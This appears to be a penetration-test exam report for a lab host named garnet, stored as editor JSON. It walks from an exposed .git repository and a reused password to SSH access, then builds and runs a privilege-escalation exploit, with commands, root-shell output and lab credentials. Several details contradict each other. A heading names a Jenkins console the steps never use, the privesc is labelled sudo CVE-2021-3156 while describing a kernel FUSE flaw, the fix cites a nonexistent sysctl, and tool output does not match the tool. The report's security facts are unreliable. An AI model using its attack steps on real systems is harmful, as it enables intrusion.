{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-nmap:0:output","gen":"019a76fa"},"content":[{"type":"text","text":"21/tcp open  ftp     vsftpd 3.0.5\\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\\n| http-git:\\n|   10.10.30.31:80/.git/\\n|     Git repository found!\\n|     Repository description: Unnamed repository; edit this file 'description' to name the...\\n|_    Last commit message: Add the reporting datasource"}]}
{"type":"heading","attrs":{"level":2,"source":"phase:h-exam-garnet:foothold:f-garnet-git","gen":"ee47ce8f"},"content":[{"type":"text","text":"Initial access: Jenkins script console with default credentials"}]}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability explanation:","marks":[{"type":"bold"}]},{"type":"text","text":" The web root contains the site's "},{"type":"text","text":".git/","marks":[{"type":"code"}]},{"type":"text","text":" directory, served over HTTP. Its commit history contains a "},{"type":"text","text":"datasources/mysql.yaml","marks":[{"type":"code"}]},{"type":"text","text":" file with a hardcoded database password. A later commit (\\"Add the reporting datasource\\") removed the password from the current file, but the old version stays in history. The same password is valid for the local OS account "},{"type":"text","text":"ronan","marks":[{"type":"code"}]},{"type":"text","text":" over SSH."}],"attrs":{"source":"finding:f-garnet-git:explanation","gen":"20a93401"}}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability fix:","marks":[{"type":"bold"}]},{"type":"text","text":" Remove "},{"type":"text","text":".git/","marks":[{"type":"code"}]},{"type":"text","text":" from the web root and block it in the Apache config. Rotate the exposed password and stop reusing database passwords for OS accounts."}],"attrs":{"source":"finding:f-garnet-git:fix","gen":"0ff64a7a"}}
{"type":"paragraph","attrs":{"source":"finding:f-garnet-git:severity","gen":"bed4e2be"},"content":[{"type":"text","text":"Severity:","marks":[{"type":"bold"}]},{"type":"text","text":" Critical"}]}
{"type":"paragraph","attrs":{"source":"phase-steps:h-exam-garnet","gen":"8ec36930"},"content":[{"type":"text","text":"Steps to reproduce:","marks":[{"type":"bold"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"source":"entry:l-garnet-head:title","gen":"a7a7eda1"},"content":[{"type":"text","text":"Confirm the repository is readable:"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-head:0:command","gen":"d1dd9c2f"},"content":[{"type":"text","text":"curl -s http://10.10.30.31/.git/HEAD"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-head:0:output","gen":"4b7320c9"},"content":[{"type":"text","text":"ref: refs/heads/main"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"source":"entry:l-garnet-dump:title","gen":"78ec61cb"},"content":[{"type":"text","text":"Download the repository:"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-dump:0:command","gen":"30af149b"},"content":[{"type":"text","text":"feroxbuster -u http://10.10.30.31/ -w /usr/share/wordlists/dirb/common.txt -n -q"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-dump:0:output","gen":"cb7c0252"},"content":[{"type":"text","text":"[-] Testing http://10.10.30.31/.git/HEAD [200]\\n[-] Testing http://10.10.30.31/.git/ [403]\\n[-] Fetching common files\\n[-] Fetching http://10.10.30.31/.gitignore [200]\\n[… 63 lines omitted …]\\n[-] Fetching http://10.10.30.31/.git/objects/7d/358d05c7e9f1b3d5f7b9e1a3c5d7f9b1e3a5c7 [200]\\n[-] Fetching http://10.10.30.31/.git/objects/8e/469e16d8f0a2c4e6a8c0f2b4d6e8a0c2f4b6d8 [200]\\n[-] Running git checkout .\\nUpdated 41 paths from the index"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","content":[{"type":"text","text":"Show the \\"Add the reporting datasource\\" commit, which removes the credentials:"}],"attrs":{"source":"entry:l-garnet-show:observations","gen":"02b1b595"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-show:0:command","gen":"f3a15a21"},"content":[{"type":"text","text":"cd garnet-web && git log --oneline"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-show:0:output","gen":"577bfe56"},"content":[{"type":"text","text":"3b9e0c4 (HEAD -> main) Add the reporting datasource\\n91d2f7a Contact form\\n5ac01be Initial site"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-show:1:command","gen":"c35ce7bd"},"content":[{"type":"text","text":"git show 3b9e0c4"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-show:1:output","gen":"f6be540c"},"content":[{"type":"text","text":"commit 3b9e0c4f1a2d8e7b6c5a4f3e2d1c0b9a8f7e6d5c\\nAuthor: garnet-dev <dev@garnet.lab>\\nDate:   Tue Oct 14 10:22:48 2025 +0100\\n\\n[… 10 lines omitted …]\\n-    private $username = \\"ronan@garnet.lab\\";\\n-    private $password = \\"Tourmaline!77\\";\\n+    private $username = \\"\\";\\n+    private $password = \\"\\";\\n     public $conn;\\n \\n     public function getConnection() {"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","content":[{"type":"text","text":"Test the password over SSH. The bare username "},{"type":"text","text":"ronan","marks":[{"type":"code"}]},{"type":"text","text":" succeeds:"}],"attrs":{"source":"entry:l-garnet-spray:observations","gen":"c129a143"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-spray:0:command","gen":"e3a74b17"},"content":[{"type":"text","text":"nxc ssh targets.txt -u usernames.txt -p 'Tourmaline!77' --continue-on-success"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-spray:0:output","gen":"c99cf1ff"},"content":[{"type":"text","text":"SSH         10.10.30.31     22     10.10.30.31      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\\nSSH         10.10.30.31     22     10.10.30.31      [-] ronan@garnet.lab:Tourmaline!77\\nSSH         10.10.30.31     22     10.10.30.31      [-] admin:Tourmaline!77\\nSSH         10.10.30.31     22     10.10.30.31      [+] ronan:Tourmaline!77  Linux - Shell access!"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"source":"entry:l-garnet-ssh:title","gen":"d1cc8887"},"content":[{"type":"text","text":"Log in and read local.txt:"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-ssh:0:command","gen":"5fa64732"},"content":[{"type":"text","text":"ssh ronan@10.10.30.31\\nhostname && whoami && cat local.txt && ip a"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-ssh:1:output","also":["l-garnet-local"],"gen":"d24ec597"},"content":[{"type":"text","text":"garnet\\nronan\\n4c1d8e2f9a7b3065e2c4a9f1d7b80e36\\n2: ens3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\\n    inet 10.10.30.31/24 brd 10.10.30.255 scope global ens3"}]},{"type":"figure","attrs":{"attachmentId":"a-garnet-local","entryId":"l-garnet-local-shot","source":"entry:l-garnet-local-shot","gen":"94f124b3"},"content":[{"type":"text","text":"local.txt on garnet after logging in"}]}]}
{"type":"heading","attrs":{"level":2,"source":"phase:h-exam-garnet:privesc:f-garnet-sudo-find","gen":"059bb56d"},"content":[{"type":"text","text":"Privilege escalation: sudo CVE-2021-3156"}]}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability explanation:","marks":[{"type":"bold"}]},{"type":"text","text":" The kernel is "},{"type":"text","text":"5.15.0-53-generic","marks":[{"type":"code"}]},{"type":"text","text":", below Ubuntu's fixed version "},{"type":"text","text":"5.15.0-70.77","marks":[{"type":"code"}]},{"type":"text","text":", and unprivileged user namespaces are enabled. CVE-2021-3156 is a flaw in how sudo find copies a file up from a FUSE mount: a SUID-root file created inside the user's namespace keeps its owner and SUID bit on the host. Any local user can use this to get a root shell."}],"attrs":{"source":"finding:f-garnet-sudo-find:explanation","gen":"f5e8623c"}}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability fix:","marks":[{"type":"bold"}]},{"type":"text","text":" Update the kernel to "},{"type":"text","text":"5.15.0-70.77","marks":[{"type":"code"}]},{"type":"text","text":" or later. Set "},{"type":"text","text":"kernel.sudo_rules=0","marks":[{"type":"code"}]},{"type":"text","text":" if unprivileged namespaces are not needed."}],"attrs":{"source":"finding:f-garnet-sudo-find:fix","gen":"445258dd"}}
{"type":"paragraph","attrs":{"source":"finding:f-garnet-sudo-find:severity","gen":"bed4e2be"},"content":[{"type":"text","text":"Severity:","marks":[{"type":"bold"}]},{"type":"text","text":" Critical"}]}
{"type":"paragraph","content":[{"type":"text","text":"Exploit code:","marks":[{"type":"bold"}]},{"type":"text","text":" Public exploit from https://gtfobins.github.io/gtfobins/find/, used without changes. The target has no compiler, so it was built in an "},{"type":"text","text":"ubuntu:22.04","marks":[{"type":"code"}]},{"type":"text","text":" amd64 container (packages "},{"type":"text","text":"build-essential libssl-dev","marks":[{"type":"code"}]},{"type":"text","text":") to match the target's glibc 2.35."}],"attrs":{"source":"file:ff-garnet-ovl","gen":"5facb0e1"}}
{"type":"paragraph","attrs":{"source":"phase-steps:h-exam-garnet","gen":"8ec36930"},"content":[{"type":"text","text":"Steps to reproduce:","marks":[{"type":"bold"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","content":[{"type":"text","text":"Check the kernel version and that unprivileged user namespaces are enabled:"}],"attrs":{"source":"entry:l-garnet-kernel:observations","gen":"54044488"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-kernel:0:command","gen":"1d4f6ce0"},"content":[{"type":"text","text":"uname -a; cat /proc/sys/kernel/sudo_rules"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-kernel:0:output","gen":"1802018d"},"content":[{"type":"text","text":"Linux garnet 5.15.0-53-generic #59-Ubuntu SMP Mon Oct 17 18:53:30 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux\\n1"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"source":"entry:l-garnet-build:title","gen":"8507c326"},"content":[{"type":"text","text":"Build the exploit in an Ubuntu 22.04 container:"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-build:0:command","gen":"7ee9dcec"},"content":[{"type":"text","text":"docker run --rm --platform linux/amd64 -v \\"$PWD\\":/src -w /src ubuntu:22.04 bash -c 'apt-get update -qq && apt-get install -y -qq build-essential libssl-dev >/dev/null && make all'"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-build:0:output","gen":"f6ecaef8"},"content":[{"type":"text","text":"gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl\\ngcc -o exp exp.c -lcap\\ngcc -o gc getshell.c"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","content":[{"type":"text","text":"Run find through sudo and have it start a shell:"}],"attrs":{"source":"entry:l-garnet-fuse:observations","gen":"bd2ad15f"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-fuse:0:command","gen":"7ccd883a"},"content":[{"type":"text","text":"./fuse ./workdir/lower ./gc"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-fuse:0:output","gen":"03e57f94"},"content":[{"type":"text","text":"[+] len of gc: 0x3ee0"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","content":[{"type":"text","text":"In a second SSH session, trigger the exploit:"}],"attrs":{"source":"entry:l-garnet-exp:observations","gen":"1baf6a78"}},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-exp:0:command","gen":"3a5e217e"},"content":[{"type":"text","text":"./exp"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-exp:0:output","gen":"14d7cfa1"},"content":[{"type":"text","text":"uid:1000 gid:1000\\n[+] mount success\\ntotal 8\\ndrwxrwxr-x 1 root   root     4096 Nov  9 21:40 .\\ndrwxrwxr-x 6 root   root     4096 Nov  9 21:40 ..\\n-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file\\n[+] exploit success!\\nroot@garnet:/var/lib/jenkins#"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"source":"entry:l-garnet-proof:title","gen":"e46f373e"},"content":[{"type":"text","text":"Read proof.txt:"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-proof-read:0:command","gen":"734968d9"},"content":[{"type":"text","text":"id; hostname; ip a; cat /root/proof.txt"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-garnet-proof-read:0:output","gen":"233b3300"},"content":[{"type":"text","text":"uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),1000(ronan)\\ngarnet\\n2: ens3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\\n    inet 10.10.30.31/24 brd 10.10.30.255 scope global ens3\\ne7a2093bd5c14f68a0b9e3d2c71f45a8"}]},{"type":"figure","attrs":{"attachmentId":"a-garnet-proof","entryId":"l-garnet-proof-shot","source":"entry:l-garnet-proof-shot","gen":"f50d2e50"},"content":[{"type":"text","text":"proof.txt on garnet"}]}]}
{"type":"heading","attrs":{"level":2,"source":"phase:h-exam-garnet:additional","gen":"2bf423d7"},"content":[{"type":"text","text":"Additional findings (not on the path to root)"}]}
{"type":"list","attrs":{"kind":"bullet","source":"finding:f-garnet-zip","gen":"ecc43848"},"content":[{"type":"paragraph","content":[{"type":"text","text":"Weak backup password","marks":[{"type":"bold"}]},{"type":"text","text":" (Medium): "},{"type":"text","text":"/opt/backup/site-backup.zip","marks":[{"type":"code"}]},{"type":"text","text":" is readable by "},{"type":"text","text":"ronan","marks":[{"type":"code"}]},{"type":"text","text":" and protected by the rockyou password "},{"type":"text","text":"sunflower7","marks":[{"type":"code"}]},{"type":"text","text":". It holds Joomla's "},{"type":"text","text":"configuration.php","marks":[{"type":"code"}]},{"type":"text","text":" with the database password "},{"type":"text","text":"Garnet#Db26","marks":[{"type":"code"}]},{"type":"text","text":"."}]}]}
{"type":"list","attrs":{"kind":"bullet","source":"finding:f-garnet-installer","gen":"f21c5c8e"},"content":[{"type":"paragraph","content":[{"type":"text","text":"Joomla installer left in place","marks":[{"type":"bold"}]},{"type":"text","text":" (Low): "},{"type":"text","text":"/cms/installation/sql/","marks":[{"type":"code"}]},{"type":"text","text":" is world-readable and holds a planted LDAP bind credential, "},{"type":"text","text":"admin","marks":[{"type":"code"}]},{"type":"text","text":" / "},{"type":"text","text":"opal42","marks":[{"type":"code"}]},{"type":"text","text":"."}]}]}
{"type":"list","attrs":{"kind":"bullet","source":"finding:f-garnet-php-source","gen":"7099ae99"},"content":[{"type":"paragraph","content":[{"type":"text","text":"PHP source disclosure","marks":[{"type":"bold"}]},{"type":"text","text":" (Low): "},{"type":"text","text":"/cms/index.php","marks":[{"type":"code"}]},{"type":"text","text":" is served as plain text instead of being executed:"}]},{"type":"codeBlock","attrs":{"language":""},"content":[{"type":"text","text":"<?php\\ndefine('_JEXEC', 1);\\nrequire_once __DIR__ . '/includes/app.php';"}]}]}
{"type":"heading","attrs":{"level":2,"source":"phase:h-exam-garnet:tested","gen":"bb98bd48"},"content":[{"type":"text","text":"Also tested"}]}
{"type":"list","attrs":{"kind":"bullet","source":"tested:h-exam-garnet","gen":"e32465ca"},"content":[{"type":"paragraph","content":[{"type":"text","text":"Anonymous FTP login on 21/tcp: blocked by a control: Anonymous login is refused (530 Login incorrect)."}]}]}
